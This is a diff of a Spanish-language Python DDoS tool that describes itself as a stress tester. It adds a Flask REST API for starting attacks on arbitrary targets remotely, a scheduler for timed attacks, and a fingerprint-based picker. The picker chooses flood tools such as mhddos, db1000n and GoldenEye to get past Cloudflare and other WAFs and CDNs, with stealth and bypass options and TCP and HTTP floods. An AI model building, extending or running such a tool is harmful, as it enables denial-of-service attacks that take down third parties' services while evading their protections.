+    global POWER_LEVEL, MULTIPLIER, MAX_CONNECTIONS, MAX_THREADS, STEALTH_MODE, WAF_BYPASS, RATE_ADAPTIVE, DURATION
+    
+    if "power_level" in config:
+        POWER_LEVEL = config["power_level"]
+        MULTIPLIER = POWER_LEVELS.get(POWER_LEVEL, 1)
+    if "connections" in config:
+        MAX_CONNECTIONS = config["connections"]
+    if "threads" in config:
+        MAX_THREADS = config["threads"]
+    if "stealth" in config:
+        STEALTH_MODE = config["stealth"]
+    if "bypass_waf" in config:
+        WAF_BYPASS = config["bypass_waf"]
+    if "rate_adaptive" in config:
+        RATE_ADAPTIVE = config["rate_adaptive"]
+    if "duration" in config:
+        DURATION = config["duration"]
+    
+    log_message("INFO", f"✅ Template '{name}' aplicado exitosamente", force_console=True)
+    return True
+
+# ============================================================================
+# API REST
+# ============================================================================
+
+def start_api_server(port: int = 8080):
+    """Inicia servidor API REST para control remoto"""
+    try:
+        from flask import Flask, jsonify, request
+        from flask_cors import CORS
+        
+        app = Flask(__name__)
+        CORS(app)
+        
+        api_attack_process = None
+        api_attack_thread = None
+        
+        @app.route('/api/status', methods=['GET'])
+        def api_status():
+            """Obtiene estado del sistema"""
+            return jsonify({
+                "status": "running",
+                "version": VERSION,
+                "monitoring_active": monitoring_active,
+                "attack_stats": {
+                    "requests_sent": attack_stats.get("requests_sent", 0),
+                    "responses_received": attack_stats.get("responses_received", 0),
+                    "errors_count": len(attack_stats.get("errors", [])),
+                    "avg_rps": attack_stats.get("avg_rps", 0),
+                    "peak_rps": attack_stats.get("peak_rps", 0)
+                }
+            })
+        
+        @app.route('/api/start', methods=['POST'])
+        def api_start_attack():
+            """Inicia un ataque desde la API"""
+            global api_attack_process, api_attack_thread, TARGET, DURATION, POWER_LEVEL
+            
+            data = request.json or {}
+            target = data.get("target")
+            duration = data.get("duration", 60)
+            power = data.get("power", "MODERATE")
+            
+            if not target:
+                return jsonify({"status": "error", "message": "Target requerido"}), 400
+            
+            TARGET = target
+            DURATION = duration
+            POWER_LEVEL = power
+            
+            def run_attack():
+                try:
+                    main()
+                except Exception as e:
+                    log_message("ERROR", f"Error en ataque desde API: {e}")
+            
+            api_attack_thread = threading.Thread(target=run_attack, daemon=True)
+            api_attack_thread.start()
+            
+            return jsonify({
+                "status": "started",
+                "target": target,
+                "duration": duration,
+                "power": power
+            })
+        
+        @app.route('/api/stop', methods=['POST'])
+        def api_stop_attack():
+            """Detiene el ataque actual"""
+            global monitoring_active
+            monitoring_active = False
+            return jsonify({"status": "stopped"})
+        
+        @app.route('/api/metrics', methods=['GET'])
+        def api_get_metrics():
+            """Obtiene métricas actuales"""
+            return jsonify({
+                "requests_sent": attack_stats.get("requests_sent", 0),
+                "responses_received": attack_stats.get("responses_received", 0),
+                "errors_count": len(attack_stats.get("errors", [])),
+                "unique_errors": attack_stats.get("unique_errors", []),
+                "avg_rps": attack_stats.get("avg_rps", 0),
+                "peak_rps": attack_stats.get("peak_rps", 0),
+                "http_codes": dict(attack_stats.get("http_codes", {})),
+                "tool_metrics": attack_stats.get("tool_metrics", {})
+            })
+        
+        @app.route('/api/templates', methods=['GET'])
+        def api_list_templates():
+            """Lista templates disponibles"""
+            return jsonify({"templates": list_attack_templates()})
+        
+        @app.route('/api/templates/<name>', methods=['GET'])
+        def api_get_template(name):
+            """Obtiene un template"""
+            template = load_attack_template(name)
+            if template:
+                return jsonify({"template": template})
+            return jsonify({"status": "error", "message": "Template no encontrado"}), 404
+        
+        @app.route('/api/templates/<name>', methods=['POST'])
+        def api_save_template(name):
+            """Guarda un template"""
+            config = request.json or {}
+            if save_attack_template(name, config):
+                return jsonify({"status": "saved"})
+            return jsonify({"status": "error", "message": "Error guardando template"}), 500
+        
+        print_color(f"\n🚀 API REST iniciada en http://{API_HOST}:{port}", Colors.GREEN, True)
+        print_color(f"📡 Endpoints disponibles:", Colors.CYAN, True)
+        print_color(f"  GET  /api/status - Estado del sistema", Colors.WHITE)
+        print_color(f"  POST /api/start - Iniciar ataque", Colors.WHITE)
+        print_color(f"  POST /api/stop - Detener ataque", Colors.WHITE)
+        print_color(f"  GET  /api/metrics - Métricas actuales", Colors.WHITE)
+        print_color(f"  GET  /api/templates - Listar templates", Colors.WHITE)
+        print_color(f"  GET  /api/templates/<name> - Obtener template", Colors.WHITE)
+        print_color(f"  POST /api/templates/<name> - Guardar template", Colors.WHITE)
+        
+        app.run(host=API_HOST, port=port, debug=False, threaded=True)
+    except ImportError:
+        print_color("❌ Flask no está instalado. Instala con: pip install flask flask-cors", Colors.RED, True)
+        sys.exit(1)
+    except Exception as e:
+        log_message("ERROR", f"Error iniciando API REST: {e}", force_console=True)
+        sys.exit(1)
+
+# ============================================================================
+# SCHEDULER
+# ============================================================================
+
+def load_scheduled_jobs() -> List[Dict]:
+    """Carga trabajos programados"""
+    try:
+        if SCHEDULER_JOBS_FILE.exists():
+            with open(SCHEDULER_JOBS_FILE, 'r', encoding='utf-8') as f:
+                return json.load(f)
+        return []
+    except Exception as e:
+        log_message("ERROR", f"Error cargando trabajos programados: {e}")
+        return []
+
+def save_scheduled_jobs(jobs: List[Dict]):
+    """Guarda trabajos programados"""
+    try:
+        SCHEDULER_JOBS_FILE.parent.mkdir(parents=True, exist_ok=True)
+        with open(SCHEDULER_JOBS_FILE, 'w', encoding='utf-8') as f:
+            json.dump(jobs, f, indent=2)
+    except Exception as e:
+        log_message("ERROR", f"Error guardando trabajos programados: {e}")
+
+def schedule_attack(name: str, target: str, duration: int, power: str, schedule_time: str):
+    """Programa un ataque para ejecutarse en un momento específico"""
+    try:
+        from datetime import datetime as dt
+        schedule_dt = dt.fromisoformat(schedule_time)
+        
+        jobs = load_scheduled_jobs()
+        job = {
+            "id": f"{name}_{int(time.time())}",
+            "name": name,
+            "target": target,
+            "duration": duration,
+            "power": power,
+            "schedule_time": schedule_time,
+            "created_at": datetime.now().isoformat(),
+            "status": "pending"
+        }
+        jobs.append(job)
+        save_scheduled_jobs(jobs)
+        
+        log_message("INFO", f"✅ Ataque '{name}' programado para {schedule_time}", force_console=True)
+        return True
+    except Exception as e:
+        log_message("ERROR", f"Error programando ataque: {e}")
+        return False
+
+def run_scheduler():
+    """Ejecuta el scheduler para procesar trabajos programados"""
+    if not SCHEDULER_ENABLED:
+        return
+    
+    try:
+        from datetime import datetime as dt
+        
+        jobs = load_scheduled_jobs()
+        current_time = dt.now()
+        
+        for job in jobs[:]:
+            if job.get("status") != "pending":
+                continue
+            
+            schedule_time = dt.fromisoformat(job.get("schedule_time"))
+            
+            if current_time >= schedule_time:
+                # Ejecutar ataque
+                log_message("INFO", f"🚀 Ejecutando ataque programado: {job.get('name')}", force_console=True)
+                
+                global TARGET, DURATION, POWER_LEVEL
+                TARGET = job.get("target")
+                DURATION = job.get("duration", 60)
+                POWER_LEVEL = job.get("power", "MODERATE")
+                
+                job["status"] = "running"
+                job["started_at"] = datetime.now().isoformat()
+                save_scheduled_jobs(jobs)
+                
+                # Ejecutar en thread separado
+                def run_scheduled_attack():
+                    try:
+                        main()
+                        job["status"] = "completed"
+                        job["completed_at"] = datetime.now().isoformat()
+                    except Exception as e:
+                        job["status"] = "failed"
+                        job["error"] = str(e)
+                    finally:
+                        save_scheduled_jobs(jobs)
+                
+                threading.Thread(target=run_scheduled_attack, daemon=True).start()
+    except Exception as e:
+        log_message("ERROR", f"Error en scheduler: {e}")
+
 def monitor_attack():
     """Monitorea el ataque en tiempo real con métricas avanzadas"""
     global monitoring_active, attack_stats
@@ -6412,6 +8157,7 @@ def monitor_attack():
     last_stats_time = start_time
     last_memory_check = start_time
     last_rps_calculation = start_time
+    last_metrics_export = start_time
     rps_history = []
     
     # Inicializar estadísticas avanzadas
@@ -6588,6 +8334,46 @@ def monitor_attack():
                 process_health = check_process_health()
                 if not process_health:
                     log_message("WARN", "⚠️ [HEALTH] Algunos procesos no están saludables", context="monitor_attack")
+            
+            # Health check del target (cada HEALTH_CHECK_INTERVAL segundos)
+            if HEALTH_CHECK_ENABLED and int(current_time - start_time) % HEALTH_CHECK_INTERVAL == 0 and int(current_time - start_time) > 0:
+                try:
+                    health_check = perform_target_health_check()
+                    
+                    # Guardar baseline en el primer check
+                    if "health_checks" not in attack_stats:
+                        attack_stats["health_checks"] = {"baseline": None, "last_check": None, "check_history": []}
+                    
+                    if attack_stats["health_checks"]["baseline"] is None:
+                        attack_stats["health_checks"]["baseline"] = health_check
+                        # También establecer baseline de latencia
+                        if "response_analysis" not in attack_stats:
+                            attack_stats["response_analysis"] = {}
+                        if health_check.get("response_time_ms"):
+                            attack_stats["response_analysis"]["baseline_latency"] = health_check["response_time_ms"]
+                        log_message("INFO", f"📊 [HEALTH] Baseline establecido: {health_check.get('response_time_ms', 0):.0f}ms, status: {health_check.get('status', 'unknown')}", context="monitor_attack")
+                    
+                    attack_stats["health_checks"]["last_check"] = health_check
+                    attack_stats["health_checks"]["check_history"].append(health_check)
+                    # Mantener solo últimas 20 mediciones
+                    if len(attack_stats["health_checks"]["check_history"]) > 20:
+                        attack_stats["health_checks"]["check_history"].pop(0)
+                    
+                    if health_check.get("status") in ["critical", "timeout", "unreachable"]:
+                        log_message("WARN", f"⚠️ [HEALTH] Target en estado crítico: {health_check.get('status')}", context="monitor_attack", force_console=True)
+                except Exception as e:
+                    log_message("ERROR", f"❌ [HEALTH] Error en health check del target: {e}", context="monitor_attack")
+            
+            # Análisis de respuesta en tiempo real (cada ANALYSIS_INTERVAL segundos)
+            if REALTIME_ANALYSIS_ENABLED and int(current_time - start_time) % ANALYSIS_INTERVAL == 0 and int(current_time - start_time) > 0:
+                try:
+                    analysis = analyze_realtime_response()
+                    if analysis.get("degradation_detected"):
+                        log_message("WARN", f"⚠️ [ANALYSIS] Degradación detectada: {analysis.get('health_status')}, error_rate: {analysis.get('error_rate', 0)*100:.1f}%", context="monitor_attack", force_console=True)
+                        # Ajustar timeouts adaptativamente
+                        adjust_adaptive_timeouts()
+                except Exception as e:
+                    log_message("ERROR", f"❌ [ANALYSIS] Error en análisis de respuesta: {e}", context="monitor_attack")
             
             # Health check completo de componentes críticos (cada 30 segundos)
             if int(current_time - start_time) % 30 == 0 and int(current_time - start_time) > 0:
@@ -7918,6 +9704,229 @@ def generate_html_report(report: Dict) -> Path:
     
     return html_file
 
+def recommend_tools_from_fingerprint(fingerprint: Dict = None) -> Dict:
+    """
+    Recomienda herramientas específicas (1-5) basadas en análisis inteligente del fingerprint.
+    Las recomendaciones son específicas para la tecnología detectada, no genéricas.
+    """
+    if fingerprint is None:
+        return {
+            "recommended_tools": ["custom_http"],
+            "tool_count": 1,
+            "reasoning": "Sin fingerprint disponible - usando herramienta base",
+            "priority": "high"
+        }
+    
+    server = fingerprint.get("server") or "Unknown"
+    if server is None:
+        server = "Unknown"
+    server_str = str(server).lower()
+    
+    framework = fingerprint.get("framework")
+    technologies = fingerprint.get("technologies", [])
+    cdn = fingerprint.get("cdn")
+    waf_raw = fingerprint.get("waf")
+    if isinstance(waf_raw, dict):
+        waf = waf_raw
+    elif isinstance(waf_raw, str):
+        waf = {"name": waf_raw, "detected": True} if waf_raw else {}
+    else:
+        waf = {}
+    
+    waf_detected = isinstance(waf, dict) and waf.get("detected", False)
+    waf_name = waf.get("name", "").lower() if isinstance(waf, dict) else ""
+    
+    protocol = fingerprint.get("protocol", PROTOCOL)
+    target_type = fingerprint.get("target_type", TARGET_TYPE)
+    network_type = fingerprint.get("network_type", NETWORK_TYPE)
+    vulnerabilities = fingerprint.get("vulnerabilities", [])
+    security_headers = fingerprint.get("security_headers", {})
+    
+    recommended_tools = []
+    reasoning = []
+    tool_count = 1
+    
+    # ESTRATEGIA 1: CDN detectado (Cloudflare, CloudFront, etc.)
+    if cdn:
+        if cdn.lower() == "cloudflare":
+            # Cloudflare: usar herramientas que evadan rate limiting
+            recommended_tools = ["custom_http", "mhddos", "db1000n"]
+            tool_count = 3
+            reasoning.append("Cloudflare detectado - usar herramientas con evasión avanzada (mhddos, db1000n)")
+        elif cdn.lower() in ["cloudfront", "fastly", "akamai"]:
+            # Otros CDNs: usar herramientas de alto throughput
+            recommended_tools = ["custom_http", "wrk", "bombardier"]
+            tool_count = 3
+            reasoning.append(f"CDN {cdn} detectado - usar herramientas de alto throughput")
+        else:
+            recommended_tools = ["custom_http", "vegeta"]
+            tool_count = 2
+            reasoning.append(f"CDN {cdn} detectado - configuración moderada")
+    
+    # ESTRATEGIA 2: WAF detectado
+    elif waf_detected:
+        if "cloudflare" in waf_name:
+            # Cloudflare WAF: herramientas especializadas
+            recommended_tools = ["custom_http", "mhddos"]
+            tool_count = 2
+            reasoning.append("Cloudflare WAF detectado - usar herramientas con bypass avanzado")
+        elif "aws" in waf_name or "imperva" in waf_name:
+            # WAFs agresivos: usar herramientas con rotación
+            recommended_tools = ["custom_http", "db1000n", "qrator"]
+            tool_count = 3
+            reasoning.append(f"WAF agresivo ({waf_name}) detectado - usar múltiples herramientas con rotación")
+        else:
+            # WAF genérico: usar herramientas con evasión
+            recommended_tools = ["custom_http", "vegeta"]
+            tool_count = 2
+            reasoning.append(f"WAF ({waf_name}) detectado - usar herramientas con evasión")
+    
+    # ESTRATEGIA 3: Framework específico
+    elif framework:
+        framework_lower = str(framework).lower()
+        
+        if "wordpress" in framework_lower:
+            # WordPress: usar herramientas ligeras (WordPress es lento)
+            recommended_tools = ["custom_http"]
+            tool_count = 1
+            reasoning.append("WordPress detectado - 1 herramienta suficiente (WordPress es lento bajo carga)")
+        
+        elif "django" in framework_lower:
+            # Django: puede manejar carga moderada
+            recommended_tools = ["custom_http", "wrk"]
+            tool_count = 2
+            reasoning.append("Django detectado - 2 herramientas para carga moderada")
+        
+        elif "flask" in framework_lower:
+            # Flask: ligero, usar herramientas eficientes
+            recommended_tools = ["custom_http", "bombardier"]
+            tool_count = 2
+            reasoning.append("Flask detectado - 2 herramientas eficientes")
+        
+        elif "node" in framework_lower or "express" in framework_lower:
+            # Node.js: puede manejar alta carga
+            recommended_tools = ["custom_http", "wrk", "vegeta"]
+            tool_count = 3
+            reasoning.append("Node.js/Express detectado - 3 herramientas para alta carga")
+        
+        elif "php" in framework_lower:
+            # PHP: generalmente lento, usar herramientas ligeras
+            recommended_tools = ["custom_http", "hey"]
+            tool_count = 2
+            reasoning.append("PHP detectado - 2 herramientas ligeras (PHP puede ser lento)")
+        
+        elif "asp" in framework_lower or ".net" in framework_lower:
+            # ASP.NET: puede manejar carga moderada
+            recommended_tools = ["custom_http", "bombardier", "vegeta"]
+            tool_count = 3
+            reasoning.append("ASP.NET detectado - 3 herramientas para carga moderada-alta")
+    
+    # ESTRATEGIA 4: Servidor web específico
+    elif "nginx" in server_str:
+        # Nginx: puede manejar alta carga
+        recommended_tools = ["custom_http", "wrk", "bombardier", "vegeta"]
+        tool_count = 4
+        reasoning.append("Nginx detectado - 4 herramientas para máximo stress (Nginx maneja alta carga)")
+    
+    elif "apache" in server_str:
+        # Apache: carga moderada
+        recommended_tools = ["custom_http", "wrk", "hey"]
+        tool_count = 3
+        reasoning.append("Apache detectado - 3 herramientas para carga moderada")
+    
+    elif "iis" in server_str:
+        # IIS: carga moderada
+        recommended_tools = ["custom_http", "bombardier"]
+        tool_count = 2
+        reasoning.append("IIS detectado - 2 herramientas para carga moderada")
+    
+    # ESTRATEGIA 5: Tecnologías detectadas
+    elif technologies:
+        tech_str = " ".join(technologies).lower()
+        
+        if "react" in tech_str or "vue" in tech_str or "angular" in tech_str:
+            # SPA: usar herramientas de alto throughput
+            recommended_tools = ["custom_http", "wrk", "bombardier"]
+            tool_count = 3
+            reasoning.append("SPA (React/Vue/Angular) detectado - 3 herramientas para alto throughput")
+        
+        elif "redis" in tech_str or "memcached" in tech_str:
+            # Con cache: puede manejar más carga
+            recommended_tools = ["custom_http", "wrk", "vegeta", "bombardier"]
+            tool_count = 4
+            reasoning.append("Cache (Redis/Memcached) detectado - 4 herramientas (cache mejora rendimiento)")
+        
+        elif "mysql" in tech_str or "postgresql" in tech_str:
+            # Con DB: puede ser cuello de botella
+            recommended_tools = ["custom_http", "hey"]
+            tool_count = 2
+            reasoning.append("Base de datos detectada - 2 herramientas (DB puede ser cuello de botella)")
+    
+    # ESTRATEGIA 6: Vulnerabilidades detectadas
+    elif vulnerabilities:
+        high_vulns = [v for v in vulnerabilities if v.get("severity") == "HIGH"]
+        if high_vulns:
+            # Vulnerabilidades: usar herramientas específicas
+            recommended_tools = ["custom_http"]
+            tool_count = 1
+            reasoning.append(f"{len(high_vulns)} vulnerabilidad(es) crítica(s) - 1 herramienta para evitar sobrecarga")
+    
+    # ESTRATEGIA 7: Security headers fuertes
+    elif security_headers.get("strict-transport-security") or security_headers.get("content-security-policy"):
+        # Headers de seguridad fuertes: usar herramientas con evasión
+        recommended_tools = ["custom_http", "mhddos"]
+        tool_count = 2
+        reasoning.append("Security headers fuertes detectados - 2 herramientas con evasión")
+    
+    # ESTRATEGIA 8: Tipo de target
+    elif target_type == "IP" and network_type == "LOCAL":
+        # IP local: usar herramientas ligeras
+        recommended_tools = ["custom_http"]
+        tool_count = 1
+        reasoning.append("IP local detectada - 1 herramienta para evitar sobrecarga del dispositivo")
+    
+    elif target_type == "IP" and network_type == "PUBLIC":
+        # IP pública: puede manejar más carga
+        recommended_tools = ["custom_http", "wrk", "bombardier"]
+        tool_count = 3
+        reasoning.append("IP pública detectada - 3 herramientas para carga alta")
+    
+    # ESTRATEGIA 9: Protocolo
+    elif protocol == "https":
+        # HTTPS: usar herramientas optimizadas para SSL
+        recommended_tools = ["custom_http", "wrk", "vegeta"]
+        tool_count = 3
+        reasoning.append("HTTPS detectado - 3 herramientas optimizadas para SSL")
+    
+    # ESTRATEGIA 10: Default (sin información específica)
+    else:
+        # Default: usar herramientas balanceadas
+        recommended_tools = ["custom_http", "wrk"]
+        tool_count = 2
+        reasoning.append("Sin información específica - 2 herramientas balanceadas por defecto")
+    
+    # Asegurar que custom_http siempre esté incluido (es la base)
+    if "custom_http" not in recommended_tools:
+        recommended_tools.insert(0, "custom_http")
+        tool_count = len(recommended_tools)
+    
+    # Limitar a máximo 5 herramientas
+    if tool_count > 5:
+        recommended_tools = recommended_tools[:5]
+        tool_count = 5
+        reasoning.append("Limitado a 5 herramientas máximo para evitar saturación")
+    
+    return {
+        "recommended_tools": recommended_tools,
+        "tool_count": tool_count,
+        "reasoning": "; ".join(reasoning) if reasoning else "Recomendación basada en análisis del target",
+        "priority": "high" if tool_count <= 2 else "medium" if tool_count <= 3 else "low",
+        "server": server_str,
+        "framework": framework,
+        "cdn": cdn,
+        "waf": waf_name if waf_detected else None
+    }
+
 def generate_stress_recommendations(fingerprint: Dict = None) -> Dict:
     """Genera recomendaciones automáticas de configuración de stress basadas en fingerprint"""
     if fingerprint is None:
@@ -8996,6 +11005,7 @@ Ejemplos:
     parser.add_argument("--check-update", action="store_true", help="Verificar si hay actualizaciones disponibles")
     parser.add_argument("--update", action="store_true", help="Actualizar la herramienta desde GitHub")
     parser.add_argument("--no-auto-update-check", action="store_true", help="Desactivar verificación automática de actualizaciones")
+    parser.add_argument("--autodiagnostic", action="store_true", help="Ejecutar autodiagnóstico completo del sistema")
     parser.add_argument("--no-tcp-optimization", action="store_true", help="Desactivar optimizaciones TCP")
     parser.add_argument("--max-payload-mb", type=int, default=10, help="Máximo tamaño de payload en MB (default: 10)")
     parser.add_argument("--connection-pool", type=int, default=1000, help="Tamaño del pool de conexiones (default: 1000)")
@@ -9003,6 +11013,14 @@ Ejemplos:
     parser.add_argument("--no-connection-warmup", action="store_true", help="Desactivar pre-calentamiento de conexiones")
     parser.add_argument("--no-rate-adaptive", action="store_true", help="Desactivar ajuste dinámico de tasa")
     parser.add_argument("--target-variations", nargs="+", help="Variaciones del target (URLs adicionales)")
+    parser.add_argument("--preset", choices=list(ATTACK_PRESETS.keys()), help="Aplicar preset de ataque preconfigurado")
+    parser.add_argument("--profile", action="store_true", help="Activar profiling de rendimiento")
+    parser.add_argument("--export-metrics", choices=["prometheus", "influxdb", "json"], help="Exportar métricas en formato especificado")
+    parser.add_argument("--save-template", type=str, help="Guardar configuración actual como template")
+    parser.add_argument("--load-template", type=str, help="Cargar template de ataque")
+    parser.add_argument("--list-templates", action="store_true", help="Listar templates disponibles")
+    parser.add_argument("--api", action="store_true", help="Iniciar API REST")
+    parser.add_argument("--api-port", type=int, default=8080, help="Puerto para API REST (default: 8080)")
     
     args = parser.parse_args()
     
@@ -9039,9 +11057,65 @@ Ejemplos:
         show_tool_status()
         sys.exit(0)
     
+    # Ejecutar autodiagnóstico (no requiere target)
+    if args.autodiagnostic:
+        run_autodiagnostic()
+        sys.exit(0)
+    
+    # Listar templates (no requiere target)
+    if args.list_templates:
+        templates = list_attack_templates()
+        if templates:
+            print_color("\n📋 Templates disponibles:", Colors.CYAN, True)
+            for template in templates:
+                print_color(f"  • {template}", Colors.GREEN)
+        else:
+            print_color("\n⚠️ No hay templates guardados", Colors.YELLOW)
+        sys.exit(0)
+    
+    # Iniciar API REST (no requiere target)
+    if args.api:
+        start_api_server(args.api_port)
+        sys.exit(0)
+    
     # Validar que se proporcione target si no se usa --web o --show-params
     if not args.target:
-        parser.error("El argumento -t/--target es requerido (excepto cuando se usa --web, --show-params, --show-tools, --check-update, --update o --install-tools)")
+        parser.error("El argumento -t/--target es requerido (excepto cuando se usa --web, --show-params, --show-tools, --check-update, --update, --install-tools, --autodiagnostic, --list-templates o --api)")
+    
+    # Activar profiling si se solicita
+    if args.profile:
+        global PROFILING_ENABLED
+        PROFILING_ENABLED = True
+        start_profiling()
+    
+    # Configurar exportación de métricas
+    if args.export_metrics:
+        global METRICS_EXPORT_ENABLED, METRICS_EXPORT_FORMAT
+        METRICS_EXPORT_ENABLED = True
+        METRICS_EXPORT_FORMAT = args.export_metrics
+    
+    # Guardar template
+    if args.save_template:
+        config = {
+            "power_level": args.power,
+            "connections": args.connections,
+            "threads": args.threads,
+            "stealth": args.stealth,
+            "bypass_waf": args.bypass_waf,
+            "rate_adaptive": not args.no_rate_adaptive,
+            "duration": args.duration
+        }
+        save_attack_template(args.save_template, config)
+        sys.exit(0)
+    
+    # Cargar template
+    if args.load_template:
+        if not apply_attack_template(args.load_template):
+            sys.exit(1)
+    
+    # Aplicar preset si se especifica
+    if args.preset:
+        apply_attack_preset(args.preset)
     
     # Configurar variables globales
     TARGET = args.target
@@ -9241,66 +11315,91 @@ Ejemplos:
     log_message("INFO", f"Límite de herramientas: {MAX_TOOLS_DEPLOY} (memoria: {memory_percent:.1f}%)")
     
     if ATTACK_MODE == "MIXED":
-        # Desplegar múltiples herramientas CON DESPLIEGUE GRADUAL Y THROTTLING
-        # Priorizar herramientas más eficientes y menos pesadas
-        priority_tools = [
-            ("wrk", deploy_wrk_attack),
-            ("vegeta", deploy_vegeta_attack),
-            ("bombardier", deploy_bombardier_attack),
-            ("hey", deploy_hey_attack),
-            ("ab", deploy_ab_attack),
-        ]
+        # Obtener recomendaciones inteligentes basadas en fingerprint
+        tool_recommendations = recommend_tools_from_fingerprint(fingerprint)
+        recommended_tool_names = tool_recommendations.get("recommended_tools", ["custom_http"])
+        recommended_count = tool_recommendations.get("tool_count", 1)
+        recommendation_reasoning = tool_recommendations.get("reasoning", "Recomendación basada en análisis")
         
-        # Herramientas secundarias (más pesadas)
-        secondary_tools = [
-            ("siege", deploy_siege_attack),
-            ("goldeneye", deploy_goldeneye_attack),
-        ]
+        log_message("INFO", f"🎯 [RECOMMENDATION] Herramientas recomendadas: {', '.join(recommended_tool_names)} ({recommended_count} herramientas)", force_console=True)
+        log_message("INFO", f"📋 [RECOMMENDATION] Razón: {recommendation_reasoning}", force_console=True)
+        print_color(f"🎯 Recomendación inteligente: {recommended_count} herramienta(s) - {', '.join(recommended_tool_names)}", Colors.CYAN, True)
+        print_color(f"📋 Razón: {recommendation_reasoning}", Colors.YELLOW)
         
-        # Filtrar solo herramientas disponibles
-        available_priority = [(name, func) for name, func in priority_tools if check_command_exists(name)]
-        available_secondary = [(name, func) for name, func in secondary_tools if check_command_exists(name)]
+        # Mapeo de nombres de herramientas a funciones de despliegue
+        tool_deployment_map = {
+            "custom_http": ("custom_http", None),  # Se despliega después
+            "wrk": ("wrk", deploy_wrk_attack),
+            "vegeta": ("vegeta", deploy_vegeta_attack),
+            "bombardier": ("bombardier", deploy_bombardier_attack),
+            "hey": ("hey", deploy_hey_attack),
+            "ab": ("ab", deploy_ab_attack),
+            "siege": ("siege", deploy_siege_attack),
+            "goldeneye": ("goldeneye", deploy_goldeneye_attack),
+            "mhddos": ("mhddos", deploy_mhddos),
+            "db1000n": ("db1000n", deploy_db1000n),
+            "ddosify": ("ddosify", deploy_ddosify),
+            "qrator": ("qrator", deploy_qrator),
+        }
         
-        # Desplegar herramientas prioritarias con throttling gradual
-        print_color("📦 Desplegando herramientas prioritarias...", Colors.CYAN)
-        tools_deployed += deploy_tools_with_throttling(
-            available_priority, 
-            max_tools=MAX_TOOLS_DEPLOY,
-            initial_delay=0.5,
-            delay_increment=0.2
-        )
+        # Construir lista de herramientas recomendadas disponibles
+        recommended_tools_list = []
+        for tool_name in recommended_tool_names:
+            if tool_name in tool_deployment_map:
+                name, func = tool_deployment_map[tool_name]
+                if func and check_command_exists(name):
+                    recommended_tools_list.append((name, func))
+                elif name == "custom_http":
+                    # custom_http siempre está disponible
+                    recommended_tools_list.append((name, None))
         
-        # Desplegar herramientas secundarias si hay espacio
-        if tools_deployed < MAX_TOOLS_DEPLOY and available_secondary:
-            print_color("📦 Desplegando herramientas secundarias...", Colors.CYAN)
-            remaining_slots = MAX_TOOLS_DEPLOY - tools_deployed
-            tools_deployed += deploy_tools_with_throttling(
-                available_secondary[:remaining_slots],
-                max_tools=remaining_slots,
-                initial_delay=1.0,  # Delay mayor para herramientas más pesadas
-                delay_increment=0.3
-            )
+        # Si no hay herramientas recomendadas disponibles, usar fallback
+        if not recommended_tools_list:
+            log_message("WARN", "⚠️ Ninguna herramienta recomendada disponible - usando fallback", force_console=True)
+            recommended_tools_list = [("custom_http", None)]
         
-        # Ataques Python personalizados (más controlados)
-        if tools_deployed < MAX_TOOLS_DEPLOY:
+        # Limitar a la cantidad recomendada (máximo 5)
+        max_recommended = min(recommended_count, 5, MAX_TOOLS_DEPLOY)
+        recommended_tools_list = recommended_tools_list[:max_recommended]
+        
+        # Desplegar solo las herramientas recomendadas
+        print_color(f"📦 Desplegando {len(recommended_tools_list)} herramienta(s) recomendada(s)...", Colors.CYAN)
+        
+        for tool_name, deploy_func in recommended_tools_list:
+            if tool_name == "custom_http":
+                # custom_http se despliega después
+                continue
+            elif deploy_func and tools_deployed < max_recommended:
+                try:
+                    success = deploy_tool_gradually(tool_name, deploy_func, delay=0.5)
+                    if success:
+                        tools_deployed += 1
+                except Exception as e:
+                    log_message("ERROR", f"Error desplegando {tool_name}: {e}", force_console=True)
+        
+        # Ataque HTTP personalizado optimizado (desplegar si está recomendado o como fallback)
+        if "custom_http" in recommended_tool_names or tools_deployed == 0:
+            log_message("INFO", f"📦 [DEPLOY] Desplegando ataque HTTP personalizado...", force_console=True)
             try:
-                deploy_rudy()
-                tools_deployed += 1
+                deploy_custom_http_attack()
+                log_message("INFO", f"✅ [DEPLOY] Ataque HTTP personalizado desplegado correctamente", force_console=True)
+                if "custom_http" in recommended_tool_names:
+                    tools_deployed += 1
             except Exception as e:
-                log_message("ERROR", f"Error desplegando RUDY: {e}")
+                log_message("ERROR", f"❌ [DEPLOY] Error desplegando ataque HTTP personalizado: {e}", force_console=True)
+                import traceback
+                log_message("ERROR", f"Traceback: {traceback.format_exc()}", force_console=True)
+        else:
+            log_message("INFO", "⏭️ [DEPLOY] Omitiendo custom_http (no recomendado para este target)", force_console=True)
         
-        # Ataque HTTP personalizado optimizado (SIEMPRE desplegar - es el principal)
-        log_message("INFO", f"📦 [DEPLOY] Desplegando ataque HTTP personalizado...", force_console=True)
-        try:
-            deploy_custom_http_attack()
-            log_message("INFO", f"✅ [DEPLOY] Ataque HTTP personalizado desplegado correctamente", force_console=True)
-        except Exception as e:
-            log_message("ERROR", f"❌ [DEPLOY] Error desplegando ataque HTTP personalizado: {e}", force_console=True)
-            import traceback
-            log_message("ERROR", f"Traceback: {traceback.format_exc()}", force_console=True)
-        
-        # Ataques avanzados Python (L4 y L7) - solo si hay recursos y espacio
-        if memory_percent < MEMORY_THRESHOLD_WARN and tools_deployed < MAX_TOOLS_DEPLOY:
+        # Ataques avanzados Python (L4 y L7) - solo si hay recursos, espacio Y están recomendados
+        # Solo desplegar si se recomendaron 4+ herramientas (indica que el target puede manejar más carga)
+        should_deploy_advanced = (
+            memory_percent < MEMORY_THRESHOLD_WARN and 
+            tools_deployed < max_recommended and
+            recommended_count >= 4  # Solo si se recomendaron 4+ herramientas
+        )
+        if should_deploy_advanced:
             # Desplegar ataques avanzados L4 y L7
             advanced_attacks = [
                 deploy_tcp_flood_advanced,  # L4 - TCP flood
